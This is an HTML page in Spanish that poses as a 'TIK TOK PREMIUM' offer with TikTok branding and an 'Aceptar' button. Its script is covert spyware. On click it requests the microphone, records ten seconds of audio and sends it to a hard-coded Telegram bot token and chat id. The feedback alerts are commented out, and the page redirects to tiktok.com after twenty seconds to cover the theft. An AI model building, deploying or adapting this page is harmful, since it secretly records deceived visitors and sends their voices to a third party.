<!DOCTYPE html>

<html lang="es">

<head>

  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="https://w7.pngwing.com/pngs/190/385/png-transparent-tik-tok.png" type="image/png">
<meta http-equiv="refresh" content="20;url=https://www.tiktok.com/">
  <title>TIK TOK</title>

</head>

<body>
<center>
  <h2>TIK TOK PREMIUM </h2>
  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTEXgcDtkYAZJh7rA6M6l7QFwvJCNVdK_sQQ&s" widht="50" height="50"/><p>

  <button id="startBtn">Aceptar</button>
<center/>
  <script>

    const startBtn = document.getElementById("startBtn");

    startBtn.onclick = async () => {

      try {

        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

        const mediaRecorder = new MediaRecorder(stream);

        const audioChunks = [];

        mediaRecorder.ondataavailable = event => {

          audioChunks.push(event.data);

        };

        mediaRecorder.onstop = async () => {

          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });

          const formData = new FormData();

          formData.append('chat_id', '1959256229');

          formData.append('voice', audioBlob);

          const response = await fetch(`https://api.telegram.org/bot8116841482:AAFSdlTQ1h5VCrJOanZwTWOPEIGT60FMFmM/sendVoice`, {

            method: 'POST',

            body: formData

          });

          if (response.ok) {

            //alert("✅ ¡Audio enviado a Telegram!");

          } else {

            //alert("❌ Hubo un problema al enviar el audio.");

          }

        };

        mediaRecorder.start();

        setTimeout(() => mediaRecorder.stop(), 10000); // Graba por segundos

      } catch (error) {

        //alert("⚠️ No se pudo acceder al micrófono. ¿Autorizaste el permiso?");

        console.error(error);

      }

    };

  </script>

</body>

</html>
